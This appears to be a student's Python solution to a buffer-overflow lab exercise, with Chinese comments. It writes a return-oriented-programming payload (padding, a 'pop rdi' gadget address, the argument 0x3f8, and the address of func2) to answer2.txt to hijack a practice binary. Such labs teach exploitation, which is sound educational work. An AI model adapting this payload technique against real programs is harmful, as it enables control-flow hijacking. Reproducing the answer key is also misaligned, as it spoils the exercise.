import struct

# Padding：16字节
padding = b'A' * 16

# Gadget 地址rdi 0x4012c7
rdi_addr = 0x4012c7

# 参数0x3f8
val = 0x3f8

# 目标func2
func = 0x401216

# Payload [Padding]+[rdi_addr]+[0x3f8]+[func2]
payload = padding
payload += struct.pack('<Q', rdi_addr) # 覆盖返回地址
payload += struct.pack('<Q', val)      #  pop rdi 比较
payload += struct.pack('<Q', func)  #  ret地址

with open('answer2.txt', 'wb') as f:
    f.write(payload)

print("answer2已生成。")